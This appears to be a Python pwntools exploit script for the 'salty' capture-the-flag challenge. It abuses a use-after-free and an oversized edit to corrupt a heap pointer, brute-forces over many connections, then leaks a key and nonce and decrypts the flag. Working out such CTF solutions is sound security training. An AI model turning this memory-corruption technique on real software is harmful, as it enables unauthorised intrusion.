#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import nacl.secret
import nacl.utils


exe = context.binary = ELF('./salty')

host = args.HOST or 'challenges.bootplug.io'
port = int(args.PORT or 31339)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

# -- Exploit goes here --

def encrypt(size, data):
    io.recvuntil(b'>')
    io.sendline(b'1')
    io.recvuntil(b':')
    io.sendline(str(size).encode())
    io.recvuntil(b':')
    io.sendline(data)

def edit(idx, size, data):
    io.recvuntil(b'>')
    io.sendline(b'4')
    io.recvuntil(b':')
    io.sendline(str(idx).encode())
    io.recvuntil(b':')
    io.sendline(str(size).encode())
    io.recvuntil(b':')
    io.sendline(data)


def free(idx):
    io.recvuntil(b'>')
    io.sendline(b'3')
    io.recvuntil(b':')
    io.sendline(str(idx).encode())

def flag():
    io.recvuntil(b'>')
    io.sendline(b'5')
    kek = io.recvline()
    return kek

def printShit(idx):
    io.recvuntil(b'>')
    io.sendline(b'2')
    io.recvuntil(b':')
    io.sendline(str(idx).encode())
    data = io.recvline()
    return data

def decryptit(flag, note):
    message = bytes.fromhex(flag)
    nonce = bytes.fromhex(note[128:128+48])
    key = bytes.fromhex(note[64:64+64])
    print(f'key is {key.hex()}')
    print(f'nonce is {nonce.hex()}')
    #message = b'kekburger\n'
    box = nacl.secret.SecretBox(key)

    box = nacl.secret.SecretBox(key)

    encrypted = box.decrypt(message, nonce)
    print(encrypted)

#we overwrite a the encryptedData pointer with one byte, which make the flag function fail,
# so we need a bit of bruteforce to get that byte to be 0.
for _ in range(500):
    try:
        io = start()
        encrypt(10, b'kek')
        flag()
        free(10)
        edit(0, 73, b'a')
        flg = flag()
        shit = printShit(0)
        decryptit(flg.strip().decode('ascii'), shit.strip().decode('ascii'))
        exit(1)
    except EOFError as ex:
        io.close()
        print(ex)
        continue


# struct:
#0x00: seed - 0x20 bytes
#0x20: key
#0x30 nonce
#0x58: encrypted data
#0x60: size
